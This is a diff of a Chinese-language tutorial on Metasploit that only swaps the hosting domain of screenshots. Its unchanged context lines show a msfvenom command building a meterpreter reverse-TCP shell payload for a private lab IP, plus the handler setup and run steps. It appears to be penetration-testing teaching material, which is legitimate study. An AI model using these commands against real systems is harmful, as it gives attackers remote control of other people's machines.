@@ -11,13 +11,13 @@
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f elf > shell.elf
    ```
 
-   ![1643108165465](https://img.gyxnb.top/img/1643108165465.png)
+   ![1643108165465](https://image.201068.xyz/assets/1643108165465.png)
 
 # 三、配置监控
 
 1. 启动msf   终端内输入：`msfconsole` 启动msf
 
-   ![1643108186343](https://img.gyxnb.top/img/1643108186343.png)
+   ![1643108186343](https://image.201068.xyz/assets/1643108186343.png)
 
 2. 载入监控模块  msf中输入：  `use exploit/multi/handler`
 
@@ -27,7 +27,7 @@
 
 4. 配置payload  msf终端中输入：`show options`
 
-   ![1643108202630](https://img.gyxnb.top/img/1643108202630.png)
+   ![1643108202630](https://image.201068.xyz/assets/1643108202630.png)
 
 5. 配置payload监控IP msf终端中输入： `set  lhost  192.168.70.3`
 
@@ -37,7 +37,7 @@
 
 8. 执行监控  msf终端中输入： `run`
 
-   ![1643108218621](https://img.gyxnb.top/img/1643108218621.png)
+   ![1643108218621](https://image.201068.xyz/assets/1643108218621.png)
 
 # 四、攻击利用
 
@@ -57,7 +57,7 @@
 
 3. 完成攻击利用
 
-   ![1643108263211](https://img.gyxnb.top/img/1643108263211.png)
+   ![1643108263211](https://image.201068.xyz/assets/1643108263211.png)
 
 
 
